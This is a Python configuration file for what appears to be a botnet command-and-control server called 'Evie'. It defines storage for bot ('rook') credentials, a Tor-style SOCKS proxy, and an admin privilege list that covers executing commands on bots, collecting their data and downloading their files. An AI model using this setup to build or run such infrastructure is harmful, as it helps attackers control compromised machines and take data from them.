# -*- coding: UTF-8 -*-

import socks

databases = {

                'database'          :   'databases',
                'credentials'       :   'credentials/rooks',
                'admins'            :   'credentials/admins',
                'nodes'             :   'credentials/nodes.evd',
                'tmp'               :   'tmp/cache.evd',
                'profiles'          :   'profile',
                'share'             :   'share',
                'spam'              :   'tmp/spam.evd',
                'spam_for_admins'   :   'tmp/spam_for_admins.evd',
                'defend'            :   'tmp/defend.evd',
                'peers'             :   'tmp/peers.evd',
                'public_files'      :   'public',
                'messages'          :   'tmp/messages.evd',
                'session'           :   'credentials/session.evd',
                'preserved'         :   'preserved',
                'complements'       :   'complements/tools',
                'output'            :   'output'
        
        }

token = {

            'uniqkey_max_length'    :   32,
            'path_max_length'       :   64
        
        }

rsa = {

            'bit_size'  :   2048

        }

conf = {

            'conf_dir'      :   'conf',
            'group_name'    :   'config',
            'keys'          :   'keys.evk',
            'conf_file'     :   'config.evc',
            'token'         :   'token.evk',
            'node_info'     :   'nodes-info.evk',
            'db_passwd'     :   'pass',
            'secret_key'    :   'secret_key.evk'
        
        }

ssl = {
            
            'key'   :   '',
            'cert'  :   ''

        }

connector = {
            
                'timeout'           :   300,
                'use_proxy'         :   False,
                'proxy_type'        :   socks.PROXY_TYPE_SOCKS4,
                'proxy_addr'        :   '127.0.0.1',
                'proxy_port'        :   9050,
                'proxy_rds'         :   True,
                'proxy_username'    :   None,
                'proxy_password'    :   None
            
            }

hashing = {
            
            'chars'             :   'abcdefghijklmnopqrstuvwxyz1234567890',
            'iterations'        :   43,
            'security_number'   :   30,
            'decrement_number'  :   18
        
        }

hashing_length = {
        
                    'chars'             :   100,
                    'iterations'        :   45,
                    'security_number'   :   50,
                    'decrement_number'  :   50
        
                }

# Favor de no tocar

keys_bot = [

            'admins',
            'commands',
            'data',
            'decrementNumber',
            'iterations',
            'keys',
            'passphrase', 
            'profile', 
            'securityNumber', 
            'security_chars', 
            'servers', 
            'username'
        
        ]

keys_admin = [

                'commands',
                'decrementNumber',
                'iterations',
                'keys',
                'lastLogin',
                'lastUniqkey',
                'max_bot',
                'passphrase',
                'privileges',
                'root',
                'securityNumber',
                'security_chars',
                'uniqkey'
        
            ]

keys = keys_bot+keys_admin

privileges = {

                'ALL'           :   'Acceso a todas las acciones',
                'listBots'      :   'Lista los rook\'s registrados en la base de datos',
                'getData'       :   'Obtiene los datos recibidos que se almacenan en la base de datos',
                'getCommands'   :   'Obtiene los comandos a ser ejecutados o ya ejecutados en la base de datos',
                'executeCommand':   'Agrega un comando a ser ejecutado',
                'shareBot'      :   'Compartir un rook',
                'getToken'      :   'Obtener el token de acceso público',
                'listServers'   :   'Lista los servidores secundarios',
                'delServer'     :   'Borrar un servidor secundario',
                'addNode'       :   'Agregar nodos',
                'delNodes'      :   'Borrar nodos',
                'getNodes'      :   'Obtener nodos',
                'useNodes'      :   'Usar un conjunto de nodos',
                'updateNode'    :   'Actualiza la información de un nodo',
                'access_list'   :   'Lista los últimos inicios de sesión exitosos',
                'ping'          :   'Verifica si las credenciales son correctas',
                'getPeers'      :   'Obtiene los puntos en la red',
                'download'      :   'Descarga un archivo de un rook',
                'upload'        :   'Sube un archivo a Evie',
                'listFiles'     :   'Listar los archivos de un bot',
                'addQueue'      :   'Agregar comandos a la cola',
                'sharedFiles'   :   'Ver los archivos que suben los Jacob\'s',
                'writeNodes'    :   'Escribir nodos'
            }
